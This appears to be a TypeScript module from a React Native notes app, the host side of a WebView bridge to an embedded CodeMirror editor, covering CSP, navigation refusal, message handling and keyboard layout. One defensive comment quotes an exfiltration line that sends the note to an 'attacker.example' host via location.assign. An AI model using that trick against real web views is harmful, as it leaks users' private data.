/**
 * The native half of the bridge, with the React taken out.
 *
 * `LiveEditor.tsx` is a `WebView`, three effects and a ref. Everything it
 * actually *decides* — when a document is authoritative rather than an echo,
 * what a palette looks like as CSS, whether a `change` arriving from the web
 * view may be acted on, how much of the editor the keyboard is covering — is
 * here, as functions over values.
 *
 * That split is not tidiness. `react-native-webview` has no web build: its
 * bare `WebView.js` renders "React Native WebView does not support this
 * platform", so a Jest suite that resolves `react-native` to
 * `react-native-web` can mount `LiveEditor.tsx` and learn nothing from it.
 * A bridge that is a component is a bridge that is tested on a device or not
 * at all. This one is tested in `webviewHost.test.ts`, in plain node.
 *
 * **Nothing here may import CodeMirror.** The guest bundle is a string; the
 * editor's code lives inside it. A `@codemirror/*` import in this file would
 * put a DOM library into the React Native module graph, which is the move
 * `supa-framework.test.js` exists to catch.
 */

import { EDITOR_BUNDLE } from "./bundle.generated";
import {
  PROTOCOL_VERSION,
  acceptsChange,
  acceptsCommand,
  decode,
  echoes,
  encode,
  TO_HOST_TYPES,
  type EditorCommand,
  type ToGuest,
  type ToHost,
} from "./protocol";
import type { Colors } from "../../../design/theme";

/**
 * The palette and the measure, as the custom properties `styles.ts` draws with.
 *
 * Sent as values rather than as a scheme name for the reason no module in this
 * app holds a palette: a surface that decided its own colours would be a third
 * palette and the one nobody updates. `mono` is `fonts.mono`, which is a real
 * face on native ("Menlo" on iOS) and is passed in rather than imported so this
 * function stays free of `Platform`.
 *
 * The **measure** travels the same way, and that is the interesting half. The
 * web console switches to reading type under a CSS media query at
 * `layout.narrowBreakpoint`; the phone has `densityFor` and already knows the
 * answer. Sending the resolved numbers means one crossover rather than a
 * breakpoint written down twice in two units — and the numbers themselves are
 * exactly the web half's, because the console and the phone are showing the
 * same note.
 *
 * The compact set was measured off Obsidian mobile in PR #157: 16px on a 24px
 * line box in 24px of side padding. A blank markdown line between two
 * paragraphs is then one 24px line box, which is where the paragraph gap comes
 * from — the editor does not add one, because the buffer is the markdown and a
 * gap the file does not contain is a gap that vanishes in Obsidian.
 */
export function themeVars(
  colors: Colors,
  mono: string | undefined,
  compact: boolean,
): Record<string, string> {
  return {
    // The ground the note sits on. `surface` rather than `ground` because that
    // is what `NoteEditor`'s own status strip paints, and a seam between the
    // note and the row under it is the one thing that would give the web view
    // away.
    "--lp-bg": colors.surface,
    // The web half draws body text in `text2` beside a file tree and in `text`
    // on a phone, where the note is the whole screen. Same rule here.
    "--lp-content": compact ? colors.text : colors.text2,
    "--lp-heading": colors.text,
    "--lp-muted": colors.text2,
    "--lp-link": colors.codeKey,
    "--lp-code-bg": colors.well,
    "--lp-caret": colors.text,
    "--lp-selection": colors.accentDim,
    // `fonts.body` is `undefined` on native on purpose — there are no bundled
    // faces and a comma-separated stack is meaningless to a native text node.
    // Inside the web view we *are* a browser, so the system stack is available
    // and is what the rest of the app is already drawn in.
    "--lp-body": "-apple-system, system-ui, sans-serif",
    "--lp-mono": `${mono ?? "ui-monospace"}, ui-monospace, Menlo, monospace`,

    "--lp-size": compact ? "16px" : "14.5px",
    "--lp-leading": compact ? "1.5" : "1.75",
    "--lp-pad-top": compact ? "8px" : "14px",
    "--lp-pad-x": compact ? "24px" : "16px",
    "--lp-pad-bottom": compact ? "32px" : "14px",
  };
}

/**
 * The document the web view loads. A module constant, and that is the point.
 *
 * Nothing note-specific is in here: not the text, not the palette, not the
 * editability. All of it arrives over the bridge after the guest says `ready`.
 * If the note were baked into the HTML then `source` would change whenever the
 * note did, and react-native-webview reloads on a new `source` — which would
 * mean a full CodeMirror rebuild, and the caret and undo history thrown away,
 * every time somebody opened a file. It would also mean somebody's private
 * markdown being spliced into an HTML string on every render.
 *
 * The CSP is the structural half of "the bundle is local, not remote":
 * `default-src 'none'` means this document cannot reach the network at all, so
 * an editor that quietly started fetching from a CDN would not work rather than
 * work-and-be-wrong. The two `'unsafe-inline'` allowances are for the inline
 * bundle and the stylesheet it injects; there is no `connect-src`, no
 * `img-src` beyond data URIs, and no origin of any kind.
 */
export function editorDocument(bundle: string): string {
  return `<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; base-uri 'none'; form-action 'none'">
</head>
<body>
<script>${escapeForScript(bundle)}</script>
</body>
</html>`;
}

/**
 * Keep a `</script` inside the bundle from ending the element that holds it.
 *
 * The HTML tokenizer looks for the literal characters, not for JavaScript
 * syntax, so a string constant anywhere in 500kb of minified CodeMirror would
 * close the tag and leave the rest of the editor as visible text on the page.
 * `<\/script` is the same string to the JavaScript parser and not the same
 * string to the HTML one.
 */
export function escapeForScript(code: string): string {
  return code.replace(/<\/(script)/gi, "<\\/$1");
}

export const EDITOR_HTML = editorDocument(EDITOR_BUNDLE);

/**
 * NOTHING IN THIS DOCUMENT NAVIGATES, AND `["*"]` IS WHAT ENFORCES THAT.
 *
 * The live-preview decorations draw a link as a styled `<span>`, never an
 * `<a href>`, so there is no in-page navigation to allow — and a web view
 * holding somebody's private note has no business following a URL that appeared
 * inside it. `allowInitialLoadOnly` below is the refusal. This constant exists
 * to make sure it is *reached*.
 *
 * **`originWhitelist` is not a second, tighter refusal. It is a switch that
 * decides who answers, and the narrow setting answers by opening Safari.**
 * From `createOnShouldStartLoadWithRequest` in react-native-webview's
 * `src/WebViewShared.tsx` (13.15.0, and unchanged for years):
 *
 *     if (!passesWhitelist(compileWhitelist(originWhitelist), url)) {
 *       Linking.canOpenURL(url).then((supported) => {
 *         if (supported) return Linking.openURL(url);   // <- the FULL url
 *       });
 *       shouldStart = false;
 *     } else if (onShouldStartLoadWithRequest) {
 *       shouldStart = onShouldStartLoadWithRequest(nativeEvent);
 *     }
 *
 * The app's handler is in the `else`. A URL that *fails* the whitelist is not
 * blocked and handed to us — it is handed to the operating system. So the
 * previous value here, `["about:*"]`, did not narrow anything: a script in the
 * document running `location.assign("https://attacker.example/?d=" + note)`
 * failed the whitelist, was never shown to `allowInitialLoadOnly`, and was
 * opened in Safari with the note in the query string.
 *
 * `"*"` compiles to `^.*`, which every URL passes, so every navigation reaches
 * the handler below and is refused there with no `Linking` call at all. The
 * broad-looking value is the closed one; the narrow-looking value is the
 * exfiltration channel. The initial load is unaffected either way — the library
 * prepends `about:blank` to the compiled list itself — so the whitelist has no
 * work left to do for this web view, and the only thing it can still do is take
 * the decision away from us.
 *
 * **This is the one channel the CSP cannot close**, which is why it is worth a
 * page of comment over a one-character value. `editorDocument`'s
 * `default-src 'none'; base-uri 'none'; form-action 'none'` stops fetching,
 * framing, form posts and base rewriting; there is no directive in any browser
 * that stops `location.assign()`. Tightening this back to `["about:*"]` reads
 * exactly like hardening and restores the leak — the same shape as
 * "an absent `Origin` is allowed; `null` is not". `webviewHost.test.ts` drives
 * the library's own dispatch over both values and fails if this one stops
 * reaching the handler.
 */
export const NAVIGATION_ORIGINS: readonly string[] = Object.freeze(["*"]);

/**
 * The only navigation this web view performs is the one that loads it.
 *
 * Everything else — a link somebody pasted into their note, a redirect a
 * malformed decoration produced, a `location.assign` from a script that should
 * not exist — is refused. `false` here means the load does not happen and
 * nothing is handed to the operating system; see `NAVIGATION_ORIGINS` for why
 * that requires the whitelist to be wide open.
 */
export function allowInitialLoadOnly(request: { url: string }): boolean {
  return request.url === "about:blank" || request.url.startsWith("about:");
}

export interface HostSink {
  onChange: (text: string) => void;
  onSave: () => void;
  onFocus?: (focused: boolean) => void;
  /**
   * How tall the document laid out — see the `height` message.
   *
   * The web view is given this height at compact, where it is a child of the
   * note's page scroller and a `flex: 1` there measures to nothing.
   */
  onHeight?: (height: number) => void;
  /** Where the caret is inside the document — see the `caret` message. */
  onCaret?: (caret: { top: number; bottom: number }) => void;
  /** The guest failed to start. A blank rectangle otherwise. */
  onFailed?: (message: string) => void;
}

export interface HostBridge {
  /** Authoritative text. A no-op when it is the echo of the last `change`. */
  setDoc: (text: string) => void;
  setEditable: (editable: boolean) => void;
  setTheme: (vars: Readonly<Record<string, string>>) => void;
  /** How many points of the editor something else is covering. */
  setInset: (bottom: number) => void;
  /**
   * Run one of the accessory bar's commands against the editor.
   *
   * Nothing comes back. A command is a transaction inside the guest, and what
   * it produces — a document change — comes back the same way typing does, as
   * an ordinary `change`. A command that reported its own result would be a
   * second path into the draft, and the one that skips `NoteEditor`'s
   * frontmatter.
   */
  run: (command: EditorCommand) => void;
  /** A raw `onMessage` payload. */
  receive: (raw: string) => void;
  /** Testing seam: what the guest is believed to hold. */
  known: () => string;
}

/**
 * The host end of the bridge.
 *
 * ## Why `ready` resends everything rather than flushing a queue
 *
 * The web view is not listening while it loads, so the first `doc`, `editable`
 * and `theme` all arrive before anything can receive them. A queue would work
 * and would have an ordering to get wrong; sending the whole of the desired
 * state when the guest announces itself has no ordering at all, is idempotent,
 * and — the part a queue does not give you — is also the right behaviour if the
 * web view ever reloads underneath us, which is a state a WKWebView can enter
 * on its own after a memory warning.
 */
export function createHostBridge(send: (raw: string) => void, sink: HostSink): HostBridge {
  let ready = false;
  let doc = "";
  let editable = false;
  let vars: Readonly<Record<string, string>> = {};
  let inset = 0;
  /**
   * What the guest is believed to hold.
   *
   * The whole bridge turns on this: typing goes out as `change`, the reducer
   * re-renders with that same text, and writing that round trip back into the
   * editor replaces the document and resets the selection — the caret jumping
   * to the end of the note on every keystroke. Tracked here rather than in the
   * component so it cannot be reset by a re-render.
   */
  let known = "";

  const post = (message: ToGuest) => {
    if (!ready) return;
    send(encode(message));
  };

  return {
    setDoc: (text) => {
      /*
        `doc` is assigned BEFORE the echo check, and `known` after it, and the
        difference between those two lines is somebody's unsaved note.

        They are answering different questions. `known` is what the guest is
        believed to hold, so an echo must leave it alone — that is the guard
        that keeps the caret where the person put it. `doc` is what the *next*
        `ready` will be answered with, and an echo is still authoritative text:
        it is the round trip of what the person just typed.

        Assigning it inside the echo branch's shadow froze it at the text the
        note was opened with. A WKWebView reload — which this bridge resends
        state for precisely because one can happen on its own after a memory
        warning — then rewound the editor to that text, and because
        `replaceDocument` is annotated `externalDoc` no `change` came back, so
        `known` was left naming the rewound document and the next keystroke
        overwrote the draft. No undo entry, nothing said. Moving this line back
        under the check looks like tightening the echo guard and is silent data
        loss; see `webviewHost.test.ts`'s second `ready`.
      */
      doc = text;
      if (echoes(text, known)) return;
      known = text;
      post({ v: PROTOCOL_VERSION, type: "doc", text });
    },
    setEditable: (next) => {
      if (next === editable && ready) return;
      editable = next;
      post({ v: PROTOCOL_VERSION, type: "editable", editable: next });
    },
    setTheme: (next) => {
      vars = next;
      post({ v: PROTOCOL_VERSION, type: "theme", vars: next });
    },
    setInset: (bottom) => {
      if (bottom === inset && ready) return;
      inset = bottom;
      post({ v: PROTOCOL_VERSION, type: "inset", bottom });
    },
    /**
     * The first of the three refusals a bar key meets.
     *
     * `EditorView.editable.of(false)` does not stop a programmatic edit, and
     * **every key on the accessory bar is one** — so a bar over a note the
     * viewer may not write is not merely useless, it is the exact shape of the
     * bug `editability` documents. The bar is not rendered on such a note in
     * the first place; this is the refusal that does not depend on that
     * staying true.
     *
     * The dismiss key is exempt, because it writes nothing and is the one
     * control that must never be the one that is refused. See `writesDocument`.
     */
    run: (command) => {
      if (!acceptsCommand(editable, command)) return;
      post({ v: PROTOCOL_VERSION, type: "command", command });
    },
    known: () => known,
    receive: (raw) => {
      const message = decode<ToHost>(raw, TO_HOST_TYPES);
      if (message === null) return;
      switch (message.type) {
        case "ready":
          ready = true;
          // Everything, in the order the guest needs it: what it may do, how it
          // is drawn, and only then the note.
          send(encode({ v: PROTOCOL_VERSION, type: "editable", editable }));
          send(encode({ v: PROTOCOL_VERSION, type: "theme", vars }));
          send(encode({ v: PROTOCOL_VERSION, type: "inset", bottom: inset }));
          send(encode({ v: PROTOCOL_VERSION, type: "doc", text: doc }));
          known = doc;
          return;
        case "change":
          /**
           * A note this viewer may not write cannot go dirty, whatever the web
           * view says.
           *
           * The guest already refuses — `EditorState.readOnly` is what stops a
           * command, a paste and a drop, which `EditorView.editable` on its own
           * famously does not. This is the second refusal, on the other side of
           * a process boundary, and it is here because "the other side checked"
           * is exactly the assumption that let a read-only drop rewrite a
           * document for a release.
           */
          if (!acceptsChange(editable)) return;
          known = message.text;
          sink.onChange(message.text);
          return;
        case "save":
          if (!acceptsChange(editable)) return;
          sink.onSave();
          return;
        case "focus":
          sink.onFocus?.(message.focused);
          return;
        case "height":
          /*
            A height is a layout, not an edit, so it is not gated on `editable`
            — a note somebody may only read still has to be visible, which is
            the entire bug this message exists for. It is refused when it is not
            a usable number: `Infinity` or a negative would become a `height`
            style, and React Native drops a whole subtree rather than laying out
            a nonsense box.
          */
          if (!Number.isFinite(message.height) || message.height < 0) return;
          sink.onHeight?.(message.height);
          return;
        case "caret":
          if (!Number.isFinite(message.top) || !Number.isFinite(message.bottom)) return;
          sink.onCaret?.({ top: message.top, bottom: message.bottom });
          return;
        case "failed":
          sink.onFailed?.(message.message);
          return;
      }
    },
  };
}

/**
 * How many points of the editor something else is sitting on top of.
 *
 * Computed from where the editor actually is rather than from the keyboard's
 * height, because those are different numbers whenever anything above resizes
 * the editor for the keyboard already — a `KeyboardAvoidingView`,
 * `react-native-keyboard-controller`. Measuring the overlap means this is right
 * whether that happens or not, and goes to zero on its own if it does, rather
 * than padding the note twice.
 *
 * ## The accessory bar is added rather than measured, and that is the honest
 * shape of it
 *
 * `KeyboardSticky` positions the bar absolutely and translates it up by the
 * keyboard's height, so it is drawn *over* the editor and resizes nothing. The
 * overlap above cannot see it — there is nothing in the layout to measure — so
 * its height is added on top, from `ACCESSORY_HEIGHT`, whenever it is up.
 *
 * It is a constant rather than an `onLayout`, and the trade is worth stating:
 * a measured height would be right if the row ever grew a second line, and it
 * would also arrive a frame *after* the keyboard, which is the one frame in
 * which the caret is behind the bar and the person is watching. The row is a
 * fixed-height pill by construction — see `NoteAccessory`'s stylesheet, which
 * reads the same constant — so the number cannot drift without a test failing.
 */
export function coveredHeight(box: {
  /** The editor's top edge, in window coordinates. */
  top: number;
  height: number;
  windowHeight: number;
  /** What the keyboard occupies at the bottom of the window. 0 when hidden. */
  keyboardHeight: number;
  /** What the accessory bar occupies above the keyboard. 0 when it is not up. */
  accessoryHeight?: number;
}): number {
  if (box.keyboardHeight <= 0) return 0;
  const editorBottom = box.top + box.height;
  const keyboardTop = box.windowHeight - box.keyboardHeight;
  const overlap = Math.max(0, Math.round(editorBottom - keyboardTop));
  return overlap + Math.max(0, Math.round(box.accessoryHeight ?? 0));
}

/**
 * A line of breathing room between the caret and whatever is covering the note.
 *
 * A caret flush against the top of the keyboard is technically visible and
 * reads as clipped, and it leaves no sight of the line being typed after this
 * one. One reading line at compact — 16px on a 1.5 line box, from `themeVars` —
 * rounded to something that does not pretend to more precision than it has.
 */
export const CARET_MARGIN = 24;

/**
 * How far the surface holding the editor has to scroll to bring the caret out
 * from under the keyboard. Zero when it is already clear.
 *
 * **The counterpart of `coveredHeight`, for the density where CodeMirror cannot
 * do this itself.** At compact the web view is as tall as its document, so its
 * own scroller has nothing to scroll and `coveredBottom`'s scroll margin has
 * nothing to act on; the note's page scroller is the thing that moves. Every
 * input is a measurement — where the editor actually is, where the caret
 * actually is inside it — so this is arithmetic with no opinion about which
 * component holds the scroller, and is tested as such.
 */
export function caretOvershoot(box: {
  /** The editor's top edge, in window coordinates. Negative once scrolled past. */
  editorTop: number;
  /** The bottom of the caret, in pixels from the editor's own top edge. */
  caretBottom: number;
  windowHeight: number;
  /** What the keyboard occupies at the bottom of the window. 0 when hidden. */
  keyboardHeight: number;
  /** What the accessory bar occupies above the keyboard. 0 when it is not up. */
  accessoryHeight?: number;
}): number {
  if (box.keyboardHeight <= 0) return 0;
  const clear =
    box.windowHeight - box.keyboardHeight - Math.max(0, box.accessoryHeight ?? 0) - CARET_MARGIN;
  const caret = box.editorTop + box.caretBottom;
  return Math.max(0, Math.ceil(caret - clear));
}

/**
 * How tall the note is drawn while the guest is still measuring it, as a share
 * of the window.
 *
 * The first `height` message arrives a frame or two after the guest says
 * `ready`, and something has to be on the glass until it does. Three fifths of
 * the window is deliberately an under-estimate: a box that starts too short
 * grows into place, and one that starts too tall leaves the durability line
 * stranded below the fold and then jumps up to meet it.
 */
export const ESTIMATED_HEIGHT = 0.6;

/**
 * The box the web view is laid out in, at a given density.
 *
 * **This is the whole of the blank-editor bug, as a value.** On a phone the
 * note is one page scroller — the inline title, the Properties panel and the
 * durability line scroll with the text — and a `ScrollView`'s content container
 * has no height of its own: it is *defined* by what its children measure to. So
 * a `flex: 1` child of it has no free space to grow into and measures to zero,
 * and the note renders as a collapsed Properties row over a durability line
 * with nothing between them. It worked while the editor was a `TextInput`,
 * because a `TextInput` grows to its own content and does not need the space to
 * already exist.
 *
 * So at compact the web view **states a height**, and the only thing that knows
 * that height is the guest — see the `height` message. Given exactly its
 * document's height, the web view's own scroller has nothing to scroll and the
 * page scroller is the one scroller on the screen, which is what keeps
 * `NoteEditor`'s swipe guard and its content padding both working.
 *
 * `null` means "not sized here" — the pointer layout, where a region bounds the
 * editor and `flex: 1` from the stylesheet is right. Returning that rather than
 * a `{ flex: 1 }` keeps this a decision about *whether* to size, and leaves the
 * flexed case where it already lives.
 *
 * It is a function over numbers rather than a branch inside the component for
 * the reason the rest of this file exists: react-native-webview has no web
 * build, so a suite that renders through react-native-web cannot mount
 * `LiveEditor` without stubbing the one child under test. The deciding is here
 * so it can be pinned honestly; `nativeEditorBox.test.ts` then mounts the
 * component to prove it is this that reaches the view.
 */
export function editorBox(box: {
  compact: boolean;
  /** What the guest last measured, or `null` before its first `height`. */
  height: number | null;
  windowHeight: number;
}): { height: number } | null {
  if (!box.compact) return null;
  if (box.height !== null && Number.isFinite(box.height) && box.height > 0) {
    return { height: box.height };
  }
  return { height: Math.max(1, Math.round(box.windowHeight * ESTIMATED_HEIGHT)) };
}
